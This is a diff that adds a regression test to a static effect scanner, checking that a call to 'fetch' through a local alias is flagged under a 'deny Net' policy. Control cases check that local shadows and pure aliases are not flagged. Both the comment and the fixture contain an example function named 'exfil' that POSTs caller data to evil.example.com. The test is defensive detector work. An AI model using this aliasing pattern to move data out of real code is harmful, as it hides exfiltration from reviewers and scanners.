@@ -10495,6 +10495,70 @@ if (blk()) {
   fs.rmSync(d, { recursive: true, force: true });
 }
 
+// ── A GLOBAL REACHED THROUGH A LOCAL ALIAS IS STILL THAT GLOBAL ─────────────────────────────────────
+// CARDINAL SIN, measured on PUBLISHED 0.29.0 and found by a corpus round (ky/nypm/giget reported no Net):
+//
+//     export async function exfil(data: string) {
+//       const send = fetch;
+//       await send("https://evil.example.com/collect", { method: "POST", body: data });
+//     }
+//     deny Net  →  exit 0, `policy ✓`, 0 effectful functions
+//
+// A POST of caller data to an external host, certified clean. The global tests read the CALLEE NODE
+// (`callee.text === "fetch"`, `ctext === "globalThis.fetch"`), and an alias's callee is `send`.
+//
+// THE THIRD SPELLING OF ONE DEFECT. scan.mjs already carries a comment saying `globalThis.fetch` "read
+// silent-pure" until it was added beside the bare identifier — the instance was fixed, the class was
+// not, and the next spelling was waiting. Imports were never affected (they resolve through the symbol
+// table); rust and swift charge the aliased form already, so this was ts alone.
+//
+// THE CONTROLS ARE THE POINT. Charging any aliased call would pass the first assertion and fabricate Net
+// across every codebase that renames a local function, so the shadow rows are what make the fix a fix.
+if (blk()) {
+  const d = scratch("candor-ts-alias-");
+  const run = (src, ...args) => {
+    fs.writeFileSync(path.join(d, "a.ts"), src);
+    return spawnSync("node", [path.join(HERE, "scan.mjs"), path.join(d, "a.ts"), ...args], { encoding: "utf8" });
+  };
+  const rep = () => JSON.parse(fs.readFileSync(path.join(d, "r.json"), "utf8"));
+  const eff = (r, name) => (r.functions || []).find((f) => f.fn.endsWith("." + name));
+
+  fs.writeFileSync(path.join(d, "pol"), "deny Net\n");
+  const sin = run(`export async function exfil(data: string): Promise<void> {\n`
+                + `  const send = fetch;\n`
+                + `  await send("https://evil.example.com/collect", { method: "POST", body: data });\n}\n`,
+                  "--policy", path.join(d, "pol"));
+  check("THE DEFECT: `const send = fetch; send(url)` is Net — `deny Net` FIRES (exit 1), never a green over an aliased exfiltration",
+        sin.status === 1 && /exfil/.test(sin.stdout + sin.stderr), `status=${sin.status}`);
+
+  run(`export function aliased() { const g = fetch; return g("https://api.example.com/v1"); }\n`
+    + `export function viaGlobal() { const g = globalThis.fetch; return g("https://b.example.com/v2"); }\n`,
+      "--out", path.join(d, "r"));
+  const r1 = rep();
+  check("…and the alias still captures its HOST, so the allowlist and masking gates can see it",
+        (eff(r1, "aliased")?.hosts || []).includes("api.example.com"),
+        JSON.stringify(eff(r1, "aliased")));
+  check("…through `globalThis.fetch` bound to a local too — the qualified spelling aliases the same way",
+        (eff(r1, "viaGlobal")?.inferred || []).includes("Net"), JSON.stringify(eff(r1, "viaGlobal")));
+
+  // CONTROL 1: a project's OWN `fetch` is not the global, however it is called.
+  run(`function fetch(u: string): string { return u.toUpperCase(); }\n`
+    + `export function shadowDirect() { return fetch("/local"); }\n`
+    + `export function shadowAliased() { const g = fetch; return g("/local"); }\n`,
+      "--out", path.join(d, "r"));
+  const r2 = rep();
+  check("CONTROL: a project-local `fetch` shadow fabricates NOTHING, direct or aliased — the unwrap yields the initializer node, so the not-declared-in-this-project guard still decides",
+        !eff(r2, "shadowDirect") && !eff(r2, "shadowAliased"),
+        JSON.stringify((r2.functions || []).map((f) => f.fn)));
+
+  // CONTROL 2: aliasing an ordinary function must not become an effect.
+  run(`function helper(x: number): number { return x + 1; }\n`
+    + `export function pureAlias() { const g = helper; return g(1); }\n`, "--out", path.join(d, "r"));
+  check("CONTROL: aliasing an ordinary pure function stays pure — the unwrap classifies what the alias RESOLVES TO, it does not charge aliasing",
+        !eff(rep(), "pureAlias"), JSON.stringify((rep().functions || []).map((f) => f.fn)));
+  fs.rmSync(d, { recursive: true, force: true });
+}
+
 // ── A TREE TOO DEEP TO WALK EXITS 2, NOT 1 AND NOT 0 ────────────────────────────────────────────────
 // The AST passes recurse, so deep nesting exhausts the JS stack. Node's default for an uncaught throw
 // is a raw stack trace and EXIT 1 — and exit 1 is this family's code for A VIOLATION WAS FOUND. A CI
